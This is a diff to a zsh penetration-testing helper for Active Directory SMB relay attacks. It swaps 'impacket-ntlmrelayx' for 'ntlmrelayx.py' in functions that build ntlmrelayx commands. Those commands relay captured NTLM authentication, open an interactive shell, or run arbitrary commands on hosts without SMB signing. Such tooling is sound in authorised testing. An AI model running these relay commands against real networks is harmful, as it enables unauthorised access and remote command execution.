@@ -16,8 +16,8 @@ nb-ad-smb-relay-install              installs dependencies
 nb-ad-smb-relay-enum                 identify hosts without smb signing
 nb-ad-smb-relay-ntlmrelay            relay the captured SMB requests by responder
 nb-ad-smb-relay-ntlmrelay-shell      get interactive shell
-nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using impacket-ntlmrelayx
-nb-ad-smb-relay-multirelay-command   responder's alternative to impacket-ntlmrelayx - execute a shell command on a target host
+nb-ad-smb-relay-ntlmrelay-command    execute a shell command on a target host using ntlmrelayx.py
+nb-ad-smb-relay-multirelay-command   responder's alternative to ntlmrelayx.py - execute a shell command on a target host
 
 
 DOC
@@ -58,7 +58,7 @@ nb-ad-smb-relay-ntlmrelay() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support | tee $(__netpath)/ntlmrelayx.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(__netpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
@@ -66,7 +66,7 @@ nb-ad-smb-relay-ntlmrelay-shell() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -i | tee $(__netpath)/ntlmrelayx-shell.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(__netpath)/ntlmrelayx-shell.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-command() {
@@ -75,7 +75,7 @@ nb-ad-smb-relay-ntlmrelay-command() {
 	  local targets && __askvar targets TARGETS
 	  local cm && __askvar cm COMMAND
 
-	  print -z "sudo impacket-ntlmrelayx -tf ${targets} -smb2support -c '$cm' | tee $(__netpath)/ntlmrelayx-command.txt"
+	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c '$cm' | tee $(__netpath)/ntlmrelayx-command.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
